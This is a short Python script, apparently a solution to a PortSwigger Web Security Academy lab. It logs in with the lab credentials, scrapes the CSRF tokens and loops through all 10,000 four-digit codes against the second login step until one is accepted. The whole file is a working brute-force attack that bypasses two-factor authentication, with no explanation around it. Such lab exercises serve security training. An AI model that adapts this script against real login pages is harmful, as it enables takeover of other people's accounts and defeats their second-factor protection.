import sys
import requests

for i in range(9999):
    r1=requests.get("https://0a0000b7032dd323c0eb21cc000600dd.web-security-academy.net/login")

    # print("session1=" + r1.cookies['session'])
    session1 = r1.cookies['session']
    # print("csrf1=" + str(r1.content).split("csrf")[1].split("\"")[2])

    csrf1 = str(r1.content).split("csrf")[1].split("\"")[2]

    myheaders1 = {'session':session1}
    mybody1 = "csrf=" + csrf1 + "&username=carlos&password=montoya"

    r2 = requests.Session()
    r3 = r2.post("https://0a0000b7032dd323c0eb21cc000600dd.web-security-academy.net/login", cookies = myheaders1, data = mybody1, allow_redirects=True)

    csrf2 = str(r3.content).split("csrf")[1].split("\"")[2]

    mybody2 = "csrf=" + csrf2 + "&mfa-code=" + str(i).zfill(4)

    r4 = r2.post("https://0a0000b7032dd323c0eb21cc000600dd.web-security-academy.net/login2", data = mybody2)

    print(str(i).zfill(4))
    
    output = str(r4.content).split("class=is-warning")[1].split(">")[1].split("<")[0]
        
    if output != "Incorrect security code":
        print("OTP found: " + str(i).zfill(4))
        break
